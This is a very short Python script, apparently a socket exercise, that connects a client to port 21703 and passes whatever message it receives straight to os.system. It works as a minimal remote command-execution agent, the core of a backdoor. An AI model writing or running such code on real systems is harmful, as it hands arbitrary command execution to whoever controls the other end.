from sockets import *
import os

if __name__ == "__main__":
    c = client()
    c.connect(port=21703)
    msg = c.receive()
    os.system(msg)
    c.close()
